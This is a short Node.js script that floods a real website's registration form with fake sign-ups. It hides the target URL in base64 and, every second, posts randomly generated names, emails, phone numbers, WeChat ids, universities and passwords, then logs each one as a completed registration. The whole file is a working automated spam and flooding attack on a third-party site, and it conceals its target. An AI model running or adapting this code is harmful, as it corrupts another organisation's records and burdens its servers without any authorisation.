const faker = require('faker');
var randomName = require("chinese-random-name");
const university = ["University of Oxford", "University of Cambridge", "Imperial College London", "University College London", "London School of Economics and Political Science", "University of Edinburgh", "King’s College London", "University of Manchester", "University of Bristol", "University of Glasgow", "University of Southampton", "University of Birmingham", "Queen Mary, University of London", "University of Warwick", "The University of Sheffield", "University of Liverpool", "The University of Nottingham", "University of Leeds", "University of Exeter"]
const lead_source = ["LinkedIn领英", "Google/other search", "University seminars", "WeChat", "Sina Weibo", "Facebook", "Other events", "Friends", "Other"]
const url = Buffer.from("aHR0cDovL3d3dy5tY2l3b3JsZHdpZGUuY29tLmNuL3JlZ19zYXZlMi5waHA/SG9zdD0gd3d3Lm1jaXdvcmxkd2lkZS5jb20uY24mQ29ubmVjdGlvbj0ga2VlcC1hbGl2ZSZPcmlnaW49IGh0dHA6Ly93d3cubWNpd29ybGR3aWRlLmNvbS5jbiZSZWZlcmVyPSBodHRwOi8vd3d3Lm1jaXdvcmxkd2lkZS5jb20uY24vcmVnLnBocA==", 'base64').toString('binary')
var axios = require('axios');
var FormData = require('form-data');
const txtgen = require('txtgen');

const sendPostRequest = async () => {

    var fullName = randomName.generate();
    // get random index value
    var randomIndex_uni = Math.floor(Math.random() * university.length);
    var randomIndex_lead = Math.floor(Math.random() * lead_source.length);
    var password = faker.internet.password()

    var email = faker.internet.email(faker.name.firstName(), faker.name.lastName(), faker.random.word() + '.' + faker.random.word());


    var data = new FormData();
    data.append('FirstName', fullName);
    data.append('University', '英国');
    data.append('uk', university[randomIndex_uni]);
    data.append('Email', email);
    data.append('wechatid', faker.internet.userName());
    data.append('Phone', faker.phone.phoneNumber('1##########'));
    data.append('knowabout', lead_source[randomIndex_lead]);
    data.append('liuyan22', txtgen.paragraph())
    data.append('password', password);
    data.append('password2', password);


    var config = {
        method: 'post',
        url: url,
        headers: {
            ...data.getHeaders()
        },
        data: data
    };

    await axios(config)
        .then(function (response) {
            console.log(`Registration Complete: ${fullName} - ${email} - ${password}`)
        })
        .catch(function (error) {
        });
}

setInterval(sendPostRequest, 1000);
